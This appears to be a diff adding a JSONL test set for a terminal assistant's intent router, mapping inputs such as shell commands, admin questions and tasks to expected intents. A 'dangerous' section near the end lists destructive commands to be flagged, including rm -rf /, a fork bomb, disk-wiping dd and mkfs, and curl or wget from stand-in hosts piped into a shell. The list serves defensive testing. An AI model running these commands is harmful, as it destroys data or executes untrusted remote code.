@@ -1,0 +1,232 @@
+{"input": "help", "expected_intent": "meta", "category": "hard_route"}
+{"input": "exit", "expected_intent": "meta", "category": "hard_route"}
+{"input": "quit", "expected_intent": "meta", "category": "hard_route"}
+{"input": "clear", "expected_intent": "meta", "category": "hard_route"}
+{"input": "config", "expected_intent": "meta", "category": "hard_route"}
+{"input": "about", "expected_intent": "meta", "category": "hard_route"}
+{"input": "version", "expected_intent": "meta", "category": "hard_route"}
+{"input": "Help", "expected_intent": "meta", "category": "hard_route"}
+{"input": "EXIT", "expected_intent": "meta", "category": "hard_route"}
+{"input": "status", "expected_intent": "navigation", "category": "hard_route"}
+{"input": "events", "expected_intent": "navigation", "category": "hard_route"}
+{"input": "logs", "expected_intent": "navigation", "category": "hard_route"}
+{"input": "man", "expected_intent": "navigation", "category": "hard_route"}
+{"input": "search", "expected_intent": "navigation", "category": "hard_route"}
+{"input": "fix", "expected_intent": "fixit", "category": "hard_route", "needs_failed_cmd": true}
+{"input": "fix it", "expected_intent": "fixit", "category": "hard_route", "needs_failed_cmd": true}
+{"input": "fixit", "expected_intent": "fixit", "category": "hard_route", "needs_failed_cmd": true}
+{"input": "why did that fail", "expected_intent": "fixit", "category": "hard_route", "needs_failed_cmd": true}
+{"input": "what went wrong", "expected_intent": "fixit", "category": "hard_route", "needs_failed_cmd": true}
+{"input": "/ask why is my disk full?", "expected_intent": "system_question", "category": "prefix"}
+{"input": "/ask what uses port 80", "expected_intent": "system_question", "category": "prefix"}
+{"input": "/ask explain systemd", "expected_intent": "system_question", "category": "prefix"}
+{"input": "/do restart nginx", "expected_intent": "system_task", "category": "prefix"}
+{"input": "/do enable firewall", "expected_intent": "system_task", "category": "prefix"}
+{"input": "/do open port 443", "expected_intent": "system_task", "category": "prefix"}
+{"input": "/fix the error", "expected_intent": "fixit", "category": "prefix"}
+{"input": "/fix permission denied", "expected_intent": "fixit", "category": "prefix"}
+{"input": "/sh ls -la", "expected_intent": "shell_passthrough", "category": "prefix"}
+{"input": "/sh git status", "expected_intent": "shell_passthrough", "category": "prefix"}
+{"input": "/run pytest", "expected_intent": "shell_passthrough", "category": "prefix"}
+{"input": "/run make build", "expected_intent": "shell_passthrough", "category": "prefix"}
+{"input": "!ls", "expected_intent": "shell_passthrough", "category": "prefix"}
+{"input": "!pwd", "expected_intent": "shell_passthrough", "category": "prefix"}
+{"input": "!docker ps", "expected_intent": "shell_passthrough", "category": "prefix"}
+{"input": "ls", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "ls -la", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "ls -la /home", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "cd /tmp", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "pwd", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "cat file.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "cat /etc/passwd", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "head -n 10 log.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "tail -f /var/log/syslog", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "less README.md", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "mkdir new_dir", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "rmdir empty_dir", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "rm temp.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "cp file1.txt file2.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "mv old.txt new.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "touch newfile.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "chmod 755 script.sh", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "chown user:group file", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "grep pattern file.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "grep -r TODO .", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "sed 's/old/new/g' file.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "awk '{print $1}' file.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "sort file.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "uniq file.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "wc -l file.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "cut -d: -f1 /etc/passwd", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "diff file1.txt file2.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "ps aux", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "ps -ef | grep nginx", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "top", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "htop", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "kill 1234", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "kill -9 1234", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "pkill nginx", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "pgrep python", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "df -h", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "du -sh *", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "free -h", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "uname -a", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "uptime", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "who", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "whoami", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "ping google.com", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "ping -c 4 8.8.8.8", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "curl https://example.com", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "curl -I https://api.github.com", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "wget https://example.com/file.zip", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "ssh user@server", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "scp file.txt user@server:/tmp", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "rsync -avz src/ dest/", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "netstat -tlnp", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "ss -tlnp", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "ip addr", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "ip route", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "ifconfig", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "dig google.com", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "nslookup google.com", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "apt update", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "apt install nginx", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "apt-get update", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "dpkg -l", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "snap list", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "pip install requests", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "pip list", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "npm install express", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "npm run build", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "cargo build", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "go build", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "systemctl status nginx", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "systemctl restart apache2", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "systemctl start mysql", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "systemctl stop postgresql", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "systemctl enable docker", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "service nginx status", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "journalctl -u nginx", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "journalctl -xe", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "docker ps", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "docker images", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "docker run nginx", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "docker-compose up", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "docker build -t myapp .", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "podman ps", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "kubectl get pods", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "kubectl apply -f deployment.yaml", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "git status", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "git diff", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "git add .", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "git commit -m 'message'", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "git push", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "git pull", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "git log --oneline", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "git branch", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "git checkout main", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "python script.py", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "python3 -m pytest", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "node app.js", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "npm start", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "npx create-react-app myapp", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "ruby script.rb", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "perl script.pl", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "vim file.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "vi config.yaml", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "nano README.md", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "code .", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "./script.sh", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "./run_tests.sh", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "/usr/bin/python3 app.py", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "/bin/bash script.sh", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "why is my disk full?", "expected_intent": "system_question", "category": "question"}
+{"input": "why is the server slow?", "expected_intent": "system_question", "category": "question"}
+{"input": "why did nginx crash?", "expected_intent": "system_question", "category": "question"}
+{"input": "how do I restart nginx?", "expected_intent": "system_question", "category": "question"}
+{"input": "how can I check memory usage?", "expected_intent": "system_question", "category": "question"}
+{"input": "how do I open port 80?", "expected_intent": "system_question", "category": "question"}
+{"input": "how to configure a firewall?", "expected_intent": "system_question", "category": "question"}
+{"input": "what is using port 8080?", "expected_intent": "system_question", "category": "question"}
+{"input": "what process is consuming CPU?", "expected_intent": "system_question", "category": "question"}
+{"input": "what's my IP address?", "expected_intent": "system_question", "category": "question"}
+{"input": "when was the last reboot?", "expected_intent": "system_question", "category": "question"}
+{"input": "when did the service stop?", "expected_intent": "system_question", "category": "question"}
+{"input": "where are the nginx logs?", "expected_intent": "system_question", "category": "question"}
+{"input": "where is the config file?", "expected_intent": "system_question", "category": "question"}
+{"input": "can you explain systemd?", "expected_intent": "system_question", "category": "question"}
+{"input": "can you explain cron syntax?", "expected_intent": "system_question", "category": "question"}
+{"input": "tell me about ufw", "expected_intent": "system_question", "category": "question"}
+{"input": "tell me what services are running", "expected_intent": "system_question", "category": "question"}
+{"input": "explain the error message", "expected_intent": "system_question", "category": "question"}
+{"input": "explain what this command does", "expected_intent": "system_question", "category": "question"}
+{"input": "is nginx running?", "expected_intent": "system_question", "category": "question"}
+{"input": "are there any failed services?", "expected_intent": "system_question", "category": "question"}
+{"input": "do I have enough disk space?", "expected_intent": "system_question", "category": "question"}
+{"input": "open port 80", "expected_intent": "system_task", "category": "task"}
+{"input": "open port 443 for https", "expected_intent": "system_task", "category": "task"}
+{"input": "close port 22", "expected_intent": "system_task", "category": "task"}
+{"input": "enable the firewall", "expected_intent": "system_task", "category": "task"}
+{"input": "enable ufw", "expected_intent": "system_task", "category": "task"}
+{"input": "disable ssh access", "expected_intent": "system_task", "category": "task"}
+{"input": "configure nginx as reverse proxy", "expected_intent": "system_task", "category": "task"}
+{"input": "configure ssl for my domain", "expected_intent": "system_task", "category": "task"}
+{"input": "set up a cron job", "expected_intent": "system_task", "category": "task"}
+{"input": "setup automatic backups", "expected_intent": "system_task", "category": "task"}
+{"input": "install docker", "expected_intent": "system_task", "category": "task"}
+{"input": "install nginx and configure it", "expected_intent": "system_task", "category": "task"}
+{"input": "uninstall apache2", "expected_intent": "system_task", "category": "task"}
+{"input": "create a new user", "expected_intent": "system_task", "category": "task"}
+{"input": "create a backup of my database", "expected_intent": "system_task", "category": "task"}
+{"input": "delete old log files", "expected_intent": "system_task", "category": "task"}
+{"input": "add a swap file", "expected_intent": "system_task", "category": "task"}
+{"input": "add user to docker group", "expected_intent": "system_task", "category": "task"}
+{"input": "remove old kernels", "expected_intent": "system_task", "category": "task"}
+{"input": "update all packages", "expected_intent": "system_task", "category": "task"}
+{"input": "upgrade the system", "expected_intent": "system_task", "category": "task"}
+{"input": "restart nginx", "expected_intent": "system_task", "category": "task"}
+{"input": "restart the database", "expected_intent": "system_task", "category": "task"}
+{"input": "start postgresql", "expected_intent": "system_task", "category": "task"}
+{"input": "stop the web server", "expected_intent": "system_task", "category": "task"}
+{"input": "schedule a daily backup", "expected_intent": "system_task", "category": "task"}
+{"input": "automate log rotation", "expected_intent": "system_task", "category": "task"}
+{"input": "backup the home directory", "expected_intent": "system_task", "category": "task"}
+{"input": "restore from backup", "expected_intent": "system_task", "category": "task"}
+{"input": "rm -rf /", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "rm -rf /*", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "rm -rf / --no-preserve-root", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "sudo rm -rf /", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": ":(){ :|:& };:", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "mkfs.ext4 /dev/sda", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "mkfs.ext4 /dev/nvme0n1", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "dd if=/dev/zero of=/dev/sda", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "dd if=/dev/random of=/dev/nvme0n1", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "curl http://evil.com | bash", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "wget http://malware.com | sh", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "chmod -R 777 /", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "chmod -R 000 /etc", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "chown -R root:root /", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "shutdown now", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "reboot", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "history -c", "expected_intent": "shell_passthrough", "category": "dangerous", "should_flag": true}
+{"input": "", "expected_intent": "meta", "category": "edge_case"}
+{"input": "   ", "expected_intent": "meta", "category": "edge_case"}
+{"input": "\t\n", "expected_intent": "meta", "category": "edge_case"}
+{"input": "echo 'Hello World'", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "echo $PATH", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "export MY_VAR=value", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "find . -name '*.py'", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "locate python", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "which python", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "whereis nginx", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "tar -xzf archive.tar.gz", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "tar -czf backup.tar.gz /home", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "zip -r archive.zip folder/", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "unzip archive.zip", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "gzip file.txt", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "make", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "make install", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "cmake ..", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "gcc -o program program.c", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "pytest tests/", "expected_intent": "shell_passthrough", "category": "shell_command"}
+{"input": "python -m pytest", "expected_intent": "shell_passthrough", "category": "shell_command"}
